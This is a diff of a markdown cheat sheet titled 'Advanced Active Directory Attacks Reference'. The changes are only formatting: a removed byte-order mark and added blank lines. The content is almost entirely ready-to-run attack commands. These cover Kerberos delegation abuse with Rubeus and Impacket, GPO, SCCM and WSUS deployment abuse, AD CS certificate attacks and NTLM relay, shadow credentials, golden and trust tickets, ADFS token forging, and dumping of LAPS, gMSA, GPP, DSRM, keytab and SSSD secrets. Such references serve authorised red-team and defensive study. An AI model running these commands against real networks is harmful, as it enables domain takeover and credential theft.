@@ -1,4 +1,4 @@
-﻿# Advanced Active Directory Attacks Reference
+# Advanced Active Directory Attacks Reference
 
 ## Table of Contents
 1. [Delegation Attacks](#delegation-attacks)
@@ -21,6 +21,7 @@ When a user authenticates to a computer with unconstrained delegation, their TGT
 
 **Find Delegation:**
 ```powershell
+
 # PowerShell
 Get-ADComputer -Filter {TrustedForDelegation -eq $True}
 
@@ -30,6 +31,7 @@ MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
 
 **SpoolService Abuse:**
 ```bash
+
 # Check spooler service
 ls \\dc01\pipe\spoolss
 
@@ -54,6 +56,7 @@ Get-DomainComputer -TrustedToAuth | select -exp msds-AllowedToDelegateTo
 
 **Exploit with Rubeus:**
 ```powershell
+
 # S4U2 attack
 Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
 ```
@@ -66,6 +69,7 @@ getST.py -spn HOST/target.domain.local 'domain/user:password' -impersonate Admin
 ### Resource-Based Constrained Delegation (RBCD)
 
 ```powershell
+
 # Create machine account
 New-MachineAccount -MachineAccount AttackerPC -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
 
@@ -89,6 +93,7 @@ Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs | Where-Object {($_
 ### Abuse with SharpGPOAbuse
 
 ```powershell
+
 # Add local admin
 .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Vulnerable GPO"
 
@@ -120,6 +125,7 @@ RODCs contain filtered AD copy (excludes LAPS/Bitlocker keys). Forge tickets for
 - ID of the krbtgt account of the RODC (-rodcNo)
 
 ```bash
+
 # Impacket keylistattack
 keylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full
 
@@ -139,6 +145,7 @@ Rubeus.exe golden /rodcNumber:25078 /aes256:RODC_AES256_KEY /user:Administrator 
 ### SCCM Attack with MalSCCM
 
 ```bash
+
 # Locate SCCM server
 MalSCCM.exe locate
 
@@ -167,6 +174,7 @@ MalSCCM.exe group /delete /groupname:TargetGroup
 ### SCCM Network Access Accounts
 
 ```powershell
+
 # Find SCCM blob
 Get-Wmiobject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"
 
@@ -177,6 +185,7 @@ Get-Wmiobject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_Netw
 ### WSUS Deployment Attack
 
 ```bash
+
 # Using SharpWSUS
 SharpWSUS.exe locate
 SharpWSUS.exe inspect
@@ -203,6 +212,7 @@ SharpWSUS.exe delete /updateid:GUID /computername:TARGET.domain.local /groupname
 Template allows ENROLLEE_SUPPLIES_SUBJECT with Client Authentication EKU.
 
 ```bash
+
 # Find vulnerable templates
 certipy find -u user@domain.local -p password -dc-ip DC_IP -vulnerable
 
@@ -216,6 +226,7 @@ certipy auth -pfx administrator.pfx -dc-ip DC_IP
 ### ESC4 - ACL Vulnerabilities
 
 ```python
+
 # Check for WriteProperty
 python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP -get-acl
 
@@ -229,6 +240,7 @@ python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-i
 ### ESC8 - NTLM Relay to Web Enrollment
 
 ```bash
+
 # Start relay
 ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 
@@ -242,6 +254,7 @@ Rubeus.exe asktgt /user:DC$ /certificate:BASE64_CERT /ptt
 ### Shadow Credentials
 
 ```bash
+
 # Add Key Credential (pyWhisker)
 python3 pywhisker.py -d "domain.local" -u "user1" -p "password" --target "TARGET" --action add
 
@@ -260,6 +273,7 @@ python3 getnthash.py -key 'AS-REP_KEY' domain.local/TARGET
 ### Child to Parent Domain (SID History)
 
 ```powershell
+
 # Get Enterprise Admins SID from parent
 $ParentSID = "S-1-5-21-PARENT-DOMAIN-SID-519"
 
@@ -270,6 +284,7 @@ kerberos::golden /user:Administrator /domain:child.parent.local /sid:S-1-5-21-CH
 ### Forest to Forest (Trust Ticket)
 
 ```bash
+
 # Dump trust key
 lsadump::trust /patch
 
@@ -289,6 +304,7 @@ kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /rc4:TRUST_KEY /user:Adm
 - Token signing certificate (PFX + decryption password)
 
 ```bash
+
 # Dump with ADFSDump
 .\ADFSDump.exe
 
@@ -303,6 +319,7 @@ python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.domain.local saml2 --e
 ### LAPS Password
 
 ```powershell
+
 # PowerShell
 Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
 
@@ -313,6 +330,7 @@ crackmapexec ldap DC_IP -u user -p password -M laps
 ### GMSA Password
 
 ```powershell
+
 # PowerShell + DSInternals
 $gmsa = Get-ADServiceAccount -Identity 'SVC_ACCOUNT' -Properties 'msDS-ManagedPassword'
 $mp = $gmsa.'msDS-ManagedPassword'
@@ -320,6 +338,7 @@ ConvertFrom-ADManagedPasswordBlob $mp
 ```
 
 ```bash
+
 # Linux with bloodyAD
 python bloodyAD.py -u user -p password --host DC_IP getObjectAttributes gmsaAccount$ msDS-ManagedPassword
 ```
@@ -327,6 +346,7 @@ python bloodyAD.py -u user -p password --host DC_IP getObjectAttributes gmsaAcco
 ### Group Policy Preferences (GPP)
 
 ```bash
+
 # Find in SYSVOL
 findstr /S /I cpassword \\domain.local\sysvol\domain.local\policies\*.xml
 
@@ -337,6 +357,7 @@ python3 Get-GPPPassword.py -no-pass 'DC_IP'
 ### DSRM Credentials
 
 ```powershell
+
 # Dump DSRM hash
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 
@@ -351,6 +372,7 @@ Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLog
 ### CCACHE Ticket Reuse
 
 ```bash
+
 # Find tickets
 ls /tmp/ | grep krb5cc
 
@@ -361,6 +383,7 @@ export KRB5CCNAME=/tmp/krb5cc_1000
 ### Extract from Keytab
 
 ```bash
+
 # List keys
 klist -k /etc/krb5.keytab
 
@@ -371,6 +394,7 @@ python3 keytabextract.py /etc/krb5.keytab
 ### Extract from SSSD
 
 ```bash
+
 # Database location
 /var/lib/sss/secrets/secrets.ldb
 
